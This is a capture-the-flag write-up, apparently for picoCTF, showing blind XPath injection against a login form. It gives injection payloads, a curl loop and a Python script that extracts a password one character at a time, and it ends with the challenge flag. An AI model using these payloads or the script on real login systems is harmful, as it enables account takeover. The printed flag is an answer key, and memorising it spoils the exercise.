> Hint: XPATH
## Solution
Visiting the website, we are presented with a login form (and a Robert Frost poem):
```html
```
The hint says "XPATH", and using some common XPATH injection techniques we can leak some information about the underlying DB. The idea is similar to SQL injection. We have a vulnerable query for authenticating the username and password which should be similar to:
```
string(//user[name/text()='" + input_username + "' and password/text()='" + input_password + "']/account/text())
```
So, if we inject some valid XPATH vocabulary into the query, we can manipulate it. 
For example, let's inject:
```
' or string-length(//user[position()=1]/pass)>1 or 'a'='
```
This should tell us if the password of the first username is longer than 1 character. If we submit this as the username, we get back a response from the server telling us that "You're on the right path", so we can deduce that password is longer than 1. If we try this, on the other hand, we receive a "Login Failure":
```
' or string-length(//user[position()=1]/pass)>30 or 'a'='
```
So the password is shorter than 30 characters.
Let's use the following syntax to iterate some users and check if someone's password starts with `"pico"`:
```
' or //user[position()=1]/pass[starts-with(text(),'pico')] or 'a'='
```
We'll use `curl`:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/Wireshark_twoo_twooo_two_twoo]
└─$ for i in {0..10}
do
    echo $i
    curl -s 'http://mercury.picoctf.net:16521/'  -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "name=' or //user[position()=$i]/pass[starts-with(text(),'pico')] or 'a'='+&pass=a" | grep right
done

We got a match for the third user. Now let's extract his password with the following script:
```python
from pwn import *
import requests
import string
import urllib
user_id = 3
password = ""
with log.progress('Brute-forcing password') as p:
    index = 1
    while not password.endswith("}"):
        for c in string.ascii_letters + "{}_"  + string.digits:
            p.status(f"Index: {index}, known password: '{password}', trying: '{c}'")
            r = requests.post("http://mercury.picoctf.net:16521/", data = {"name": f"' or substring(//user[position()={user_id}]/pass,{index},1)='{c}' or 'a'='", "pass": "test"})
            if "right" in r.text:
                password += c
                break
        else:
            print(f"Can't find character for index {index}!")
            break
        index += 1
print(f"Password: {password}")
```
The script uses XPATH `substring` to brute force the password character by character.
Output:
```console
┌──(user@kali)-[/media/sf_CTFs/pico/X_marks_the_spot]
└─$ python3 solve.py
[+] Brute-forcing password: Done

The flag: `picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_28cb0023}`
